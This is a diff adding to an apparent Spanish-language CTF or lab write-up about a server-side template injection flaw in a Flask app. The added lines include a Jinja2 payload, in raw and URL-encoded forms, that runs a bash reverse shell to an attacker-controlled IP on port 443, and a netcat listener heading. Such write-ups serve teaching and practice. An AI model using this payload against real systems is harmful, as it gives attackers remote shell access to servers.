@@ -131,6 +131,13 @@ al leer el código del `scritp.py` puedo ver una linea que usa el `render_templa
 Mientras leíamos el artículo sobre la vulnerabilidad, encontramos varias alternativas al uso de la ejecución de comandos. Al final nos queda el siguiente payload, el cual se encargará de ejecutar un comando que nos enviará un shell inverso con bash.
 
 ```python
+
+{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('bash -c "bash -i >& /dev/tcp/ 10.10.14.18/443 0>&1"')['read']() == 'chiv' %} a {% endif %}
+
+Nos quedara algo asi:
+
 http://10.13.37.14/profile?name={%25+if+request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.18/443+0>%261"')['read']()+%3d%3d+'chiv'+%25}+a+{%25+endif+%25}
 ```
 
+### nc -lvnp 
+![[Pasted image 20240712184542.png]]
